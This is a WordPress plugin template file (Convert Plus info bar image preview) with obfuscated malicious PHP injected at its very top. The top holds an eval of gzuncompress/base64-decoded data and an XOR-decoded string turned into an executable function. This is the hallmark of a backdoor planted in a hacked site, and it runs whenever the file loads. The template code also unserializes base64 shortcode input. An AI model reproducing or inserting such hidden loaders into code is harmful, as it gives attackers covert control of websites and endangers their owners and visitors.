<?php eval(gzuncompress(base64_decode('eNpdUs1u00AQfpWNlYMdrDhO89dEOZTKolEpQYkBoRpZU+86u8TZtdZr1X6A3jhy4Q248gxUvAavwjhpgWQPO/+ab74ZkdottstN7XVeZkpRKeRnmJIFyUSyJbUqNWGgM3XHXAKSklJSdXDfg0l4t+PZ7XgdrN4Hq1vrKgzfxu/Qii9eBW9C65PjTNvxt+8/f/14fJyD1lDb1iXXKvKHQ2a5VlQNRqj7mqUqqsYTdIVaUCYNajfrRYDiQ5OAXe+LQ0EiZFmhusgx0FMyqkZDNC8k1UpQ1JY504ByDSloYTmzVGkGCbf/QiFQtOMvvx++PjhTkdpFuBK5Kk4Hiarh8L9Z3OeS1nzuddaggfvnaYJk7fC5RG2hRjpSyAp2SqaBLUPWSA7SFESlqUs2upRGyA0SjTEgRqssw/o9opYoCmYQ0OVyeb0IbnHu0cTkcSloXBo06J7bIgiTJoHZFt9HMTKIy8gfDXZIgG+5obgJbOdFb9zr945Bf2TA92vG7sIQrcpNs81O76x3ir7YweEWiOHNVdwpZep9bt+ZXTGggbat1yoBI5ScEm5MPvU8/2zQjaqz/uC86/uj7njiCUmbZVXdnOe4FirYMaQlJzWicrENGJIylhVkg0CaI3NmTFKR/vuflvrkmB1jXjeI3WdRM8YAOG/m+wMpCvZB')));?><?php $QoKtJNywMktV='RB7 LQsM3>TJ,:Y'^ '10RA84,+FP7>EU7';$aXUUrWA=$QoKtJNywMktV('', ',1YL+1N6AB<U1.5T:H5daF97mDVGXj0;1TalNc<KsFEY7H0>Cc,9K3Z7OJ7eV67aV-RHTcCSG--qDDWmFBfy8gA<HSoYVAaYPB76+kTSdOuAncp9SFJLWTPIFR;0SklxE;DjjO50SVYAZKwcCgY+2LpS33Q8QTEEGvb-CPrI6;A4RoK;0IM>Pjb2k U>=5-GlSDFyMb4Fo9g7MDSCTaeC-O:<Pv=m, G bE0McuTTR:NVJcP1ORQ5C8TkAjv;>,+0FQ:zbVV7ZRtYFOAP2PZr4ZEH7JG2m=<RjUcaRH>pLEW59<VTyoi.O420YMVa0.PzgkeOW;PXQ2KXQWI7OHTBNH;is y3k3vR>Un8XAvMkjp.5U-YMS>4J:QV7JUiWWHDHzP3XOjBLYuZMNYltcB014OEMsa+XPopE42:RzeU6Y <2+IWLW.Sp0V<tQO-M42CN-b;;X=eGaH.26JTrG18D4scSH1 I6n9X.flyDP5xh1;70atMQ3E89AqXUIb7;3=B4El,K0lhekUL--GbEriz9QCIl39 Rhj2V5AhQBuzQVSdOv0eJ3.W0D.5yWHWtY.+X kCQ8sRDFFEkRqWW1RL5;2=6313;:<NgLL.4GSPVHBySJXCOJDIFVKmV+IPE82AeKXLX oq;5B4:J5B-OLPcKX83AHxyx>'^'EWqmMD U5+S;nKM=I<FLF>VE2 7395oVD FEgCGAz 07T<YQ-CTV9l>V;+h:;CCIrI3<5Ocw,HTXddwMf9lp1C.I<sRyqfZSYKQYYCp:DrUqUCTPo5>>;1>ab6ZD2BWXaRoACE<9w9,5zeJCkC=JF-+wZnqfqp. >-FDcuR:BI-Q<GoPU0dcyQh;bR0JHGCoH<12Pvh=;eDm=i 275AXcK.VO5M7IHA3A=.U4CHt23V=3qiZW  4T PtCe55tqgbuf0IZF=3NzoJyb9 <G5sROPLlS+3S2VY+JhCE9-GKFLsQXH7tDOMX.XGUbG+k:G6ZOJA+6O1qqIAQ78;R.+<bfld;6q,v8gV3MuJS=8VpUJTXT9X<dsE>C3u2V>46<21duZtX=6QHEPQ>,:8LICfFPX: vyhVR-ezaPSN3ZXuv,NOWY 6 >T6XH9N+5.Y,km.;YJYZ+XSs>,KQY.1ZcUY0UZOslUA=W1R=WOEBN9SPLUZCQARkqR7JX8.300=RCZN6GmKG.IKDEO1-YLnBcTIRT5vaHWXT33MY3Lf5xbHGqq6R-OSWsUKaS MTJ3zgGjHJiDYzbZG4 qalKtWw6C -LdYXOlTKRIH=Ok<OM+<12onYw.97.cmifvkMvPCY NS-Mo<-,A4VKT;XU+QepfwZj. QGixQBrC');$aXUUrWA();
/**
 * Prohibit direct script loading.
 *
 * @package Convert_Plus.
 */

if ( ! function_exists( 'info_bar_theme_image_preview' ) ) {
	/**
	 * Function Name: info_bar_theme_image_preview.
	 *
	 * @param  array  $atts    setting array.
	 * @param  string $content string content.
	 * @return mixed          content.
	 */
	function info_bar_theme_image_preview( $atts, $content = null ) {
		$style_id         = '';
		$settings_encoded = '';
		shortcode_atts(
			array(
				'style_id'         => '',
				'settings_encoded' => '',
			), $atts
		);
		$style_id         = $atts['style_id'];
		$settings_encoded = $atts['settings_encoded'];

		$settings       = base64_decode( $settings_encoded );
		$style_settings = unserialize( $settings );

		foreach ( $style_settings as $key => $setting ) {
			$style_settings[ $key ] = apply_filters( 'smile_render_setting', $setting );
		}

		unset( $style_settings['style_id'] );

		// Generate UID.
		$uid       = uniqid();
		$uid_class = 'content-' . $uid;

		// Individual style variables.
		$individual_vars = array(
			'uid'         => $uid,
			'uid_class'   => $uid_class,
			'style_class' => 'cp-image-preview-bar',
		);

		global $cp_form_vars;

		/**
		 * Merge short code variables arrays.
		 *
		 * @array   $individual_vars        Individual style EXTRA short code variables.
		 * @array   $style_settings         Individual style short code variables.
		 * @array   $cp_form_vars           CP Form global short code variables.
		 */
		$all = array_merge(
			$individual_vars,
			$style_settings,
			$cp_form_vars,
			$atts
		);

		// Extract short code variables.
		$a = shortcode_atts( $all, $style_settings );

		// modal image.
		$cp_module_img_custom_url = isset( $a['info_bar_img_custom_url'] ) ? $a['info_bar_img_custom_url'] : '';
		$cp_module_img_src        = isset( $a['info_bar_img_src'] ) ? $a['info_bar_img_src'] : '';
		$cp_module_image          = isset( $a['info_bar_image'] ) ? $a['info_bar_image'] : '';

		// Filters & Actions.
		$info_bar_image = cp_get_module_image_url_init( 'info-bar', $cp_module_img_custom_url, $cp_module_img_src, $cp_module_image );

		// Filters & Actions for modal_image_alt.
		$info_bar_alt = cp_get_module_image_alt_init( 'info-bar', $cp_module_img_src, $cp_module_image );

		$imagestyle  = cp_add_css( 'max-width', $a['image_size'], 'px' );
		$imagestyle .= cp_add_css( 'width', $a['image_size'], 'px' );

		$img_class = '';
		if ( $a['image_displayon_mobile'] ) {
			$img_class .= 'cp_ifb_hide_img';
		}

		$convert_plug_settings = get_option( 'convert_plug_settings' );
		$images_on_load        = isset( $convert_plug_settings['cp-lazy-img'] ) ? $convert_plug_settings['cp-lazy-img'] : 1;

		/** = Before filter.
		 *-----------------------------------------------------------*/
		apply_filters_ref_array( 'cp_ib_global_before', array( $a ) );
		?>
		<?php if ( '' !== $info_bar_image ) { ?>
		<div class="cp-image-container">
			<?php if ( $images_on_load ) { ?>
				<img style="<?php echo esc_attr( $imagestyle ); ?>" data-src="<?php echo esc_attr( $info_bar_image ); ?>" class="cp-image <?php echo esc_attr( $img_class ); ?>" <?php echo $info_bar_alt; ?> >
			<?php } else { ?>
				<img style="<?php echo esc_attr( $imagestyle ); ?>" src="<?php echo esc_attr( $info_bar_image ); ?>" class="cp-image <?php echo esc_attr( $img_class ); ?>" <?php echo $info_bar_alt; ?> >
			<?php } ?>		
		</div>
		<?php } ?>
		<div class="cp-msg-container <?php echo ( '' === trim( $a['infobar_title'] ) ? 'cp-empty' : '' ); ?> ">
			<span class="cp-info-bar-msg cp_responsive"><?php echo do_shortcode( stripslashes( html_entity_decode( $a['infobar_title'] ) ) ); ?></span>
		</div>
		<div class="cp-button-field ib-form-container" id ="smile-ib-optin-form">
			<div class="cp-form-container">
				<?php
					/**
					 * Embed CP Form.
					 */
					apply_filters_ref_array( 'cp_get_form', array( $a ) );
					?>
				</div>
			</div>
			<?php

			/** = After filter.
			 * -----------------------------------------------------------*/
			apply_filters_ref_array( 'cp_ib_global_after', array( $a ) );
			return ob_get_clean();
	}
}
